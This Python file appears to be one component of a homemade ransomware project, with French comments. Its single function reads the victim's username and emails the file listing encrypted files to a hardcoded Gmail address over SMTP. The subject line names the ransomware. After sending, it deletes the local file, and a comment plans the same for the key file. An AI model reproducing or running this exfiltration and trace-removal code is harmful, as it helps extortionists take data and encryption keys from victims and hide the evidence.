# coding=utf-8
#!/usr/bin/python

def F_SendMail():

    import smtplib, os

    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText

    # GET THE ENVIRONMENT VARIABLES (Thomas)
    current_user = os.environ["USERNAME"]

    password = ' '
    subject = "Here are the files for the ransomware on " + current_user + " machine"
    body = "This is an email with attachment sent from Python"
    sender_email = "youshallnotpass123456@gmail.com"
    receiver_email = "youshallnotpass123456@gmail.com"
    # attention raw_input sur python 2.7
    password = input("Type your password and press enter: ")

    # Create a multipart message and set headers
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject

    # Add body to email
    message.attach(MIMEText(body, "plain"))

    filename = "C:\Users\Admin\Desktop\AnSo\listeResultatChiffrement.txt"  # In same directory as script

    # Open txt file in binary mode
    with open(filename, "rb") as attachment:
        # Add file as application/octet-stream
        # Email client can usually download this automatically as attachment
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    # Encode file in ASCII characters to send by email
    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header('Content-Disposition', "attachment; filename= {}".format(filename))

    # Add attachment to message and convert message to string
    message.attach(part)
    text = message.as_string()

    # Log in to server using secure context and send email
    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    server.login(sender_email, password)

    try:
        server.sendmail(sender_email, receiver_email, text)
    except:
        print("Error: unable to send email")
    else:
        print("Successfully sent email")  # TODO envoyer PLUSIEURS pj

        # Je supprime les .txy sur le pc
        os.remove("C:\Users\Admin\Desktop\AnSo\\listeResultatChiffrement.txt")
        # idem avec  C:\Users\Admin\Desktop\AnSo\\fichierKey.txt
